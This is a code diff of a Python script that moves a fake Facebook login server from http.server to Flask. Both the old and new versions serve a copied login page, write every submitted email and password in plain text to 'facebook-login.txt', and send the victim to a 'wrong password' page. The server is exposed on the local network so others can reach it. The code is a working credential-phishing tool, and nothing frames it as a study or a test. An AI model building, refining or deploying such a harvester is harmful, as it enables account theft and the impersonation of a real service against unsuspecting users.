@@ -1,35 +1,35 @@
-﻿from http.server import HTTPServer, SimpleHTTPRequestHandler
-from urllib.parse import parse_qs
-from datetime import datetime
+﻿from datetime import datetime
 import socket
+from flask import Flask, render_template, request, redirect, send_from_directory
 
-class LocalFacebookHandler(SimpleHTTPRequestHandler):
-    def do_GET(self):
-        if self.path in ('', '/'): 
-            self.send_response(302)
-            self.send_header('Location', '/login.html')
-            self.end_headers()
-            return
-        return super().do_GET()
+app = Flask(__name__, template_folder='.')
 
-    def do_POST(self):
-        if self.path == '/login':
-            length = int(self.headers.get('Content-Length', 0))
-            body = self.rfile.read(length).decode('utf-8')
-            data = parse_qs(body)
-            email = data.get('email', [''])[0]
-            password = data.get('pass', [''])[0]
-            line = f"{datetime.now():%Y-%m-%d %H:%M:%S}\temail={email}\tpassword={password}\n"
-            with open('facebook-login.txt', 'a', encoding='utf-8') as file:
-                file.write(line)
-            self.send_response(303)
-            self.send_header('Location', '/wrong.html')
-            self.end_headers()
-        else:
-            self.send_error(404, 'Not Found')
+@app.route('/')
+def root():
+    return render_template('login.html')
 
-    def log_message(self, format, *args):
-        return
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        email = request.form.get('email', '')
+        password = request.form.get('pass', '')
+        line = f"{datetime.now():%Y-%m-%d %H:%M:%S}\temail={email}\tpassword={password}\n"
+        with open('facebook-login.txt', 'a', encoding='utf-8') as file:
+            file.write(line)
+        return redirect('/wrong')
+    return render_template('login.html')
+
+@app.route('/home')
+def home_page():
+    return render_template('home.html')
+
+@app.route('/wrong')
+def wrong_page():
+    return render_template('wrong.html')
+
+@app.route('/<path:filename>')
+def static_files(filename):
+    return send_from_directory(app.template_folder, filename)
 
 
 def get_host_ip():
@@ -44,10 +44,6 @@ if __name__ == '__main__':
     port = 8000
     host = '0.0.0.0'
     actual_ip = get_host_ip()
-    server = HTTPServer((host, port), LocalFacebookHandler)
     print(f'Serving on http://localhost:{port}/')
     print(f'Accessible from same network at http://{actual_ip}:{port}/')
-    try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print('\nServer stopped.')
+    app.run(host=host, port=port)
